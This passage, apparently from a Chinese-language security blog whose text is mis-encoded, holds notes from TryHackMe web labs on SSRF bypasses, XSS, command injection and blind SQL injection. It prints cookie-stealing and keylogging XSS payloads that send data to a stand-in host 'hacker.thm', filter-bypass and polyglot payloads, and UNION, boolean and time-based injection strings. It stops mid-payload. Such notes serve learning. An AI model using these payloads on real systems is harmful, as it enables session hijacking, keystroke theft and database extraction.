è®°å½•æ¥ç»•è¿‡æ­¤æ¼æ´ã€‚</p><p>å…è®¸åˆ—è¡¨:</p><p>å…è®¸åˆ—è¡¨æ˜¯æŒ‡æ‰€æœ‰è¯·æ±‚éƒ½è¢«æ‹’ç»ï¼Œé™¤éå®ƒä»¬å‡ºç°åœ¨åˆ—è¡¨ä¸­æˆ–ä¸ç‰¹å®šæ¨¡å¼åŒ¹é…ï¼Œä¾‹å¦‚å‚æ•°ä¸­ä½¿ç”¨çš„ URL å¿…é¡»ä»¥ <a href="https://website.thm/">https://website.thm</a> å¼€å¤´çš„è§„åˆ™<strong>ã€‚</strong> æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨æ”»å‡»è€…çš„åŸŸåä¸Šåˆ›å»ºå­åŸŸï¼ˆå¦‚ <a href="https://website.thm.attackers-domain.thm)æ¥å¿«é€Ÿè§„é¿æ­¤è§„åˆ™.åº”ç”¨ç¨‹åºé€»è¾‘ç°åœ¨å°†å…è®¸æ­¤è¾“å…¥,å¹¶å…è®¸æ”»å‡»è€…æ§åˆ¶å†…éƒ¨/">https://website.thm.attackers-domain.thmï¼‰æ¥å¿«é€Ÿè§„é¿æ­¤è§„åˆ™ã€‚åº”ç”¨ç¨‹åºé€»è¾‘ç°åœ¨å°†å…è®¸æ­¤è¾“å…¥ï¼Œå¹¶å…è®¸æ”»å‡»è€…æ§åˆ¶å†…éƒ¨</a> HTTP è¯·æ±‚ã€‚</p><p>æ‰“å¼€é‡å®šå‘</p><p>å¦‚æœä¸Šè¿°ç»•è¿‡ä¸èµ·ä½œç”¨ï¼Œæ”»å‡»è€…è¿˜æœ‰ä¸€ä¸ªæŠ€å·§ï¼Œå³å¼€æ”¾é‡å®šå‘ã€‚å¼€æ”¾é‡å®šå‘æ˜¯æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªç«¯ç‚¹ï¼Œç½‘ç«™è®¿é—®è€…ä¼šè‡ªåŠ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªç½‘ç«™åœ°å€ã€‚ä»¥é“¾æ¥ <a href="https://website.thm/link?url=https://tryhackme.com">https://website.thm/link?url=https://tryhackme.com</a> ä¸ºä¾‹ã€‚åˆ›å»ºæ­¤ç«¯ç‚¹æ˜¯ä¸ºäº†è®°å½•è®¿é—®è€…å‡ºäºå¹¿å‘Š/è¥é”€ç›®çš„ç‚¹å‡»æ­¤é“¾æ¥çš„æ¬¡æ•°ã€‚ä½†æƒ³è±¡ä¸€ä¸‹ï¼Œå­˜åœ¨ä¸€ä¸ªæ½œåœ¨çš„ SSRF æ¼æ´ï¼Œå…¶ä¸¥æ ¼çš„è§„åˆ™åªå…è®¸ä»¥ <a href="https://website.thm/">https://website.thm/</a> å¼€å¤´çš„ URLã€‚æ”»å‡»è€…å¯åˆ©ç”¨ä¸Šè¿°åŠŸèƒ½å°†å†…éƒ¨ HTTP è¯·æ±‚é‡å®šå‘åˆ°æ”»å‡»è€…é€‰æ‹©çš„åŸŸã€‚</p><p>å®ä¾‹:</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ³¨å†Œç”¨æˆ· ç„¶åæ‰¾åˆ°å¤´åƒæ›´æ¢è¿™é‡Œ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061955791.png" alt="image-20240306195524628"></p><p>æ­£å¸¸æ›´æ¢æ˜¯å¯ä»¥çš„ï¼Œç„¶åæˆ‘ä»¬åœ¨æ›´æ¢å¤´åƒè¿™é‡Œåœ¨å‰ç«¯æ‰¾åˆ°ç›¸å…³ç‚¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061957627.png" alt="image-20240306195734519"></p><p>valueå€¼å¯ä»¥æ›´æ¢æˆæˆ‘ä»¬æƒ³è¦çš„ ç›´æ¥æ¢æˆprivateæ˜¯ä¸è¡Œçš„ </p><p>ç„¶åå¯ä»¥åˆ©ç”¨ç›®å½•éå†æ¥è¿›è¡Œæ›¿æ¢ xx/../private</p><p>ç„¶åå†ç½‘é¡µæºç ä¸­ æ‰¾åˆ°ç›¸å…³ä¿¡æ¯</p><h3 id="Cross-site-Scripting-XSS"><a href="#Cross-site-Scripting-XSS" class="headerlink" title="Cross-site Scripting (XSS)"></a>Cross-site Scripting (XSS)</h3><p>1.xssæœ‰æ•ˆè´Ÿè½½</p><p>æœ‰æ•ˆè´Ÿè½½å°±æ˜¯æˆ‘ä»¬åœ¨ç›®æ ‡è®¡ç®—æœºä¸­æ’å…¥çš„javascriptä»£ç </p><p>æœ€ç®€å•çš„éªŒè¯æ˜¯å¦å­˜åœ¨xssæ¼æ´å¦‚ä¸‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å°±æ˜¯è·å–cookieå€¼ </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ä¼šè¯çªƒå–ï¼š<br>&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>));&lt;/script&gt;   <br>ä¸Šé¢æ˜¯ç»è¿‡base64ç¼–ç è¿‡åçš„<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(documnet.<span class="hljs-property">cookie</span>)&lt;<span class="hljs-regexp">/script&gt;   /</span><span class="hljs-regexp">/è¿™ä¸ªæ˜¯ä¸ç»è¿‡ç¼–ç çš„</span><br></code></pre></td></tr></table></figure><p><strong>é”®ç›˜è®°å½•å™¨ï¼š</strong></p><p>ä¸‹é¢çš„ä»£ç å……å½“é”®ç›˜è®°å½•å™¨ã€‚è¿™æ„å‘³ç€æ‚¨åœ¨ç½‘é¡µä¸Šè¾“å…¥çš„ä»»ä½•å†…å®¹éƒ½å°†è¢«è½¬å‘åˆ°é»‘å®¢æ§åˆ¶ä¸‹çš„ç½‘ç«™ã€‚å¦‚æœæœ‰æ•ˆè´Ÿè½½å®‰è£…åœ¨æ¥å—çš„ç”¨æˆ·ç™»å½•åæˆ–ä¿¡ç”¨å¡è¯¦ç»†ä¿¡æ¯ä¸Šçš„ç½‘ç«™ï¼Œè¿™å¯èƒ½ä¼šéå¸¸å…·æœ‰ç ´åæ€§ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeypress</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="hljs-title function_">btoa</span>(e.<span class="hljs-property">key</span>) );&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>ä¸šåŠ¡é€»è¾‘ï¼š</strong></p><p>æ­¤æœ‰æ•ˆè´Ÿè½½æ¯”ä¸Šè¿°ç¤ºä¾‹å…·ä½“å¾—å¤šã€‚è¿™å°†æ˜¯å…³äºè°ƒç”¨ç‰¹å®šçš„ç½‘ç»œèµ„æºæˆ– JavaScript å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªç”¨äºæ›´æ”¹ç”¨æˆ·ç”µå­é‚®ä»¶åœ°å€çš„ JavaScript å‡½æ•°ï¼Œç§°ä¸º .æœ‰æ•ˆè´Ÿè½½å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š<code>user.changeEmail()</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;user.<span class="hljs-title function_">changeEmail</span>(<span class="hljs-string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>2.åå°„å‹xss</p><p>äº§ç”ŸåŸå› :</p><p>åœ¨httpè¯·æ±‚ä¸­å½“ç”¨æˆ·çš„æ•°æ®åœ¨ç½‘é¡µä¸­æœªåšä»»ä½•éªŒè¯æ—¶ å°±ä¼šè§¦å‘åå°„å‹xss</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072020920.png" alt="image-20240307202047691"></p><p>å¦‚ä½•æµ‹è¯•åå°„çš„xss:</p><ul><li>URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„å‚æ•°</li><li>URL æ–‡ä»¶è·¯å¾„</li><li>æœ‰æ—¶æ˜¯ HTTP æ ‡å¤´ï¼ˆå°½ç®¡åœ¨å®è·µä¸­ä¸å¤ªå¯èƒ½è¢«åˆ©ç”¨ï¼‰</li></ul><p>3.å­˜å‚¨çš„xss</p><p>å­˜å‚¨åœ¨webæœåŠ¡å™¨å†…éƒ¨ å½“ç”¨æˆ·è®¿é—®æ—¶è¿›è¡Œè§¦å‘</p><p>ä¸€èˆ¬å‡ºç°åœ¨è¯„è®ºåŒºçš„åœ°æ–¹ æœ‰çš„æ—¶å€™æ£€æµ‹ä¸ä¸¥ å°±å¯èƒ½ä¼šé€ æˆå­˜å‚¨å‹çš„xss</p><p>å¦‚ä½•æµ‹è¯•å­˜å‚¨å‹çš„xss:</p><p>æ‚¨éœ€è¦æµ‹è¯•æ¯ä¸ªå¯èƒ½çš„å…¥å£ç‚¹ï¼Œå…¶ä¸­ä¼¼ä¹å­˜å‚¨äº†æ•°æ®ï¼Œç„¶ååœ¨å…¶ä»–ç”¨æˆ·æœ‰æƒè®¿é—®çš„åŒºåŸŸä¸­æ˜¾ç¤ºå›æ¥;å…¶ä¸­çš„ä¸€ä¸ªå°ä¾‹å­å¯èƒ½æ˜¯</p><ul><li>åœ¨åšå®¢ä¸Šçš„è¯„è®º</li><li>ç”¨æˆ·é…ç½®æ–‡ä»¶ä¿¡æ¯</li><li>ç½‘ç«™åˆ—è¡¨</li></ul><p>4.åŸºäºDOMçš„xss</p><p>ä»€ä¹ˆæ˜¯DOMï¼Ÿ</p><p>DOM ä»£è¡¨ <strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odelï¼Œæ˜¯ä¸€ä¸ª HTML å’Œ XML æ–‡æ¡£çš„ç¼–ç¨‹æ¥å£ã€‚å®ƒè¡¨ç¤ºé¡µé¢ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥æ›´æ”¹æ–‡æ¡£ç»“æ„ã€æ ·å¼å’Œå†…å®¹ã€‚ä¸€ä¸ª ç½‘é¡µæ˜¯ä¸€ä¸ªæ–‡æ¡£ï¼Œæ­¤æ–‡æ¡£å¯ä»¥æ˜¾ç¤ºåœ¨æµè§ˆå™¨çª—å£ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸º HTML æºæ˜¾ç¤ºã€‚HTML DOM çš„å›¾è¡¨æ˜¯ å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" alt="img"></p><p>è¿›ä¸€æ­¥äº†è§£DOM å¯ä»¥å‚è€ƒ:<a href="https://www.w3.org/">https://www.w3.org/</a></p><p>åˆ©ç”¨DOMï¼š</p><p>DOMçš„xssæ˜¯ç›´æ¥åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„ å¹¶ä¸ä¼šå°†æ•°æ®æäº¤ç»™åç«¯</p><p><strong>å¦‚ä½•æµ‹è¯•åŸºäº Dom çš„ XSSï¼š</strong></p><p>åŸºäº DOM çš„ XSS å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå¹¶ä¸”éœ€è¦ä¸€å®šçš„ JavaScript çŸ¥è¯†æ‰èƒ½è¯»å–æºä»£ç ã€‚æ‚¨éœ€è¦æŸ¥æ‰¾è®¿é—®æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„æŸäº›å˜é‡ï¼ˆä¾‹å¦‚â€œ<strong>window.location.x</strong>â€å‚æ•°ï¼‰çš„ä»£ç éƒ¨åˆ†ã€‚</p><p>å½“ä½ æ‰¾åˆ°è¿™äº›ä»£ç æ—¶ï¼Œä½ éœ€è¦çœ‹çœ‹å®ƒä»¬æ˜¯å¦‚ä½•å¤„ç†çš„ï¼Œä»¥åŠè¿™äº›å€¼æ˜¯å¦æ›¾ç»è¢«å†™å…¥ç½‘é¡µçš„ DOM æˆ–ä¼ é€’ç»™ä¸å®‰å…¨çš„ JavaScript æ–¹æ³•ï¼Œå¦‚ <strong>evalï¼ˆï¼‰ã€‚</strong></p><p>5.ç›²æ³¨xss</p><p>å°±æ˜¯æˆ‘ä»¬å¹¶ä¸ä¼šä»æ˜é¢ä¸Šæ”¶åˆ°xssæ‰§è¡ŒæˆåŠŸçš„ç»“æœ æŸ¥çœ‹æ‰§è¡Œç»“æœéœ€è¦å€ŸåŠ©å…¶ä»–çš„å·¥å…·</p><p><a href="https://github.com/mandatoryprogrammer/xsshunter-express">GitHub - mandatoryprogrammer/xsshunter-express: An easy-to-setup version of XSS Hunter. Sets up in five minutes and requires no maintenance!</a> </p><p>å¦‚ä½•æµ‹è¯•ç›²æ³¨XSSï¼š</p><p>æˆ‘ä»¬éœ€è¦è®¾ç½®æ­£ç¡®çš„payload ç„¶åé€šè¿‡httpç­‰æ¥è¿”å›ç»“æœ ä»¥æ­¤æ¥æŸ¥çœ‹æ˜¯å¦æ‰§è¡ŒæˆåŠŸ  ç›²æ³¨xsså’Œå­˜å‚¨å‹xsså·®ä¸å¤š </p><p>6.å®Œå–„æœ‰æ•ˆpayload</p><p>è¦æ˜¯æœ‰å‡ºç°xssçš„åœ°æ–¹ æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ’å…¥åœ°æ–¹çš„é¡µé¢æºä»£ç  æ ¹æ®æ ‡ç­¾æ¥è¿›è¡Œç›¸å…³ç»•è¿‡</p><p>level 1:</p><p>æœ€åŸºæœ¬çš„payloadå³å¯</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;thm&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>script&gt;<br></code></pre></td></tr></table></figure><p>level2:</p><p>è®°å¾—é—­åˆ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072208714.png" alt="image-20240307220828518"></p><p>level 3:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯æœ‰ä¸€ä¸ª</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure><p> æŠŠjavascriptä»£ç å½“æˆæ™®é€šæ–‡æœ¬äº† ç„¶åæˆ‘ä»¬é€šè¿‡æŠŠ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;textarea&gt;</span><br></code></pre></td></tr></table></figure><p>ç»™é—­åˆæ‰ å°±å¯ä»¥ç»•è¿‡è¿™ä¸€ç‚¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072223498.png" alt="image-20240307222307327"></p><p>level 4:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#x27;;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-symbol">&#x27;THM</span>&#x27;)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072234171.png" alt="image-20240307223418032"></p><p>æˆ‘ä»¬è¿˜æ˜¯æŸ¥çœ‹ç½‘é¡µæºä»£ç  æ‰¾ç›¸å¯¹åº”çš„ç‚¹ ç„¶åé—­åˆâ€™; åé¢çš„// æ˜¯ä¸ºäº†æŠŠåŸæœ¬çš„ç»™æ³¨é‡Šæ‰</p><p>levl 5:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScIPt</span>&gt;</span>alert(&#x27;THM&#x27;)<span class="hljs-tag">&lt;/<span class="hljs-name">SciPt</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æŠŠscriptç»™è¿‡æ»¤äº† </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072240813.png" alt="image-20240307224015727"></p><p>level 6:</p><p>è¿™ä¸ªçš„è¯æ˜¯åˆ©ç”¨äº†imgæ ‡ç­¾çš„å…¶ä»–å±æ€§</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/images/</span>cat.jpg<span class="hljs-string">&quot;onload=&quot;</span>alert(<span class="hljs-string">&#x27;THM&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072247655.png" alt="image-20240307224756487"></p><p>ç„¶åthmç»™äº†ä¸€ä¸ª ä¸€ä¸ªpayloadé€šå…³çš„ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="hljs-comment">/* */</span>onerror=alert(<span class="hljs-string">&#x27;THM&#x27;</span>) )<span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt;<span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</span><br></code></pre></td></tr></table></figure><p>7.ç›²æ‰“xsså®ä¾‹ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åæˆ‘ä»¬åœ¨</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072322533.png" alt="image-20240307232232286"></p><p>è¿™ä¸ªåœ°æ–¹è¿›è¡Œxss</p><p>ç„¶åæŸ¥çœ‹ç½‘é¡µæºä»£ç çš„è¯ æˆ‘ä»¬æŠŠ<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072323320.png" alt="image-20240307232331171"></p><p>è¿™ä¸ªç»™é—­åˆæ‰ </p><p>æ‰€ä»¥payloadä¸º:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;THM&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä»…ä»…æ˜¯ä¸€ä¸ªæ€è·¯ ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›‘å¬æ¥è·å–cookieçš„å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;fetch(&#x27;https:/</span><span class="hljs-regexp">/hacker.thm:port?cookie=&#x27; + btoa(document.cookie));&lt;/</span>script&gt;   <br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081021326.png" alt="image-20240308102108056"></p><p>åœ¨æœ¬åœ°çš„è¯ å¼€å¯ä¸€ä¸ªpythonçš„httpæœåŠ¡ ç„¶åç«¯å£æ”¹æˆ8000å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081045437.png" alt="image-20240308104554138"></p><p>(è¿™ä¸ªæˆ‘åšçš„æ—¶å€™æœ‰ç‚¹å°bugï¼Œsessionå€¼ä¸å¯¹)</p><h3 id="Command-Injection-å‘½ä»¤æ³¨å…¥"><a href="#Command-Injection-å‘½ä»¤æ³¨å…¥" class="headerlink" title="Command Injection(å‘½ä»¤æ³¨å…¥)"></a>Command Injection(å‘½ä»¤æ³¨å…¥)</h3><p>å‘½ä»¤æ‰§è¡Œ åˆ†ä¸ºä¸¤ç±»:</p><p>1.æœ‰å›æ˜¾çš„rce</p><p>2.æ— å›æ˜¾çš„rce</p><p>å¯ä»¥ç»“åˆsleepå‘½ä»¤æ¥è¿›è¡Œï¼Œæˆ–è€…æ˜¯åˆ©ç”¨é‡å®šå‘çš„ç¬¦å·ï¼ŒæŠŠç»“æœæ‰“å°åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­  ç±»ä¼¼äºcat /flag &gt; 1.txt è¿˜å¯ä»¥åˆ©ç”¨curlè¿›è¡Œdnså¤–å¸¦</p><p>ä¿®å¤å‘½ä»¤æ³¨å…¥:</p><p>  æ–¹æ³•:å‡å°‘ä½¿ç”¨å±é™©çš„å‡½æ•°ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ é€šè¿‡wafè¿›è¡Œé˜²å¾¡</p><p>å®ä¾‹:</p><p>127.0.0.1;è¦æ‰§è¡Œçš„å‘½ä»¤</p><h3 id="SQL-Injection-sqlæ³¨å…¥"><a href="#SQL-Injection-sqlæ³¨å…¥" class="headerlink" title="SQL Injection (sqlæ³¨å…¥)"></a>SQL Injection (sqlæ³¨å…¥)</h3><p>ä¸‹é¢è®°å½•ä¸€äº›çŸ¥è¯†ç‚¹:</p><p>select * from users limit 1; =&gt; æŸ¥è¯¢ç¬¬ä¸€è¡Œçš„æ•°æ® </p><p>select * from users limit 1,1; æ„æ€æ˜¯è·³è¿‡ç¬¬ä¸€è¡Œï¼Œæ‰“å°ç¬¬äºŒè¡Œ</p><p>limit 2,1 å°±æ˜¯è·³è¿‡å‰ä¸¤è¡Œï¼Œæ‰“å°ç¬¬ä¸‰è¡Œ</p><p>like % è¿›è¡ŒåŒ¹é…  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403082316313.png" alt="image-20240308231602070"></p><p>;ä»£è¡¨sqlæŸ¥è¯¢çš„ç»“æŸ</p><p>å®è·µ:</p><p>level1: å¾ˆå¸¸è§„çš„sqlæ³¨å…¥  (-2 union select 1,2,group_concat(id,username,password) from staff_users)</p><p>level2:ä¸‡èƒ½å¯†ç ç™»å½•</p><p>level3:  å°±æ˜¯åˆ©ç”¨äº†likeè¯­å¥å’Œç›²æ³¨çš„ç‰¹æ€§ï¼Œåœ¨æœ¬ç•Œé¢ä¸­å­˜åœ¨çš„å°±è¿”å›trueï¼Œå¦åˆ™å°±è¿”å›false  (å¸ƒå°”ç›²æ³¨)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>é¦–å…ˆæˆ‘ä»¬å…ˆæŸ¥è¯¢æ•°æ®åº“  admin123<span class="hljs-string">&#x27; union select 1,2,3 where database() like &#x27;</span>a%<span class="hljs-string">&#x27;;--  é€šè¿‡çˆ†ç ´æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ•°æ®åº“çš„åå­—=&gt;sqli_three</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.ç„¶åæˆ‘ä»¬å†å»çˆ†ç ´è¡¨å admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--  å¾—åˆ°è¡¨çš„åå­—=&gt;users</span><br><br><span class="hljs-number">3.</span>æ¥ç€æ˜¯çˆ†åˆ—å admin123<span class="hljs-string">&#x27; union select 1,2,3 from information_schema.columns where table_schema=&#x27;</span>sqli_thre<span class="hljs-string">e&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name like &#x27;</span>a%<span class="hljs-string">&#x27;;--  </span><br><span class="hljs-string">4. åˆ—åæœ‰çš„ä¸ä»…ä»…ä¸€ä¸ª ç„¶åæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªä¹‹åå°±éœ€è¦æŠŠè¿™ä¸ªç»™æ’é™¤æ‰ </span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span>!=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">-- </span><br><br><span class="hljs-number">5.</span>å¾—åˆ°åˆ—åä¹‹åå°±æ˜¯å†…å®¹äº† ç„¶åä¸€æ ·çš„æ€è·¯ åˆ—åå¾—åˆ°çš„æ˜¯ (id,username,<span class="hljs-keyword">password</span>)<br>admin123<span class="hljs-string">&#x27; union select 1,2,3 from users where username like &#x27;</span>a%<span class="hljs-string">&#x27;;--</span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br>æœ€ç»ˆå¾—åˆ° <span class="hljs-keyword">admin</span> <span class="hljs-number">3845</span><br></code></pre></td></tr></table></figure><p>level4: (æ—¶é—´ç›²æ³¨)</p><p>è·Ÿå¸ƒå°”ç›²æ³¨çš„åŒºåˆ«æ˜¯ï¼Œå®ƒå¹¶ä¸ä¼šè¿”å›è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸ ç„¶åæœ‰ä¸€ä¸ªè¯­å¥æ˜¯å»¶è¿Ÿçš„ sleep() æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œåˆ¤æ–­ç›¸å…³ä¿¡æ¯</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,sleep(5);-- //åˆ¤æ–­æœ‰ä¸¤åˆ— å› 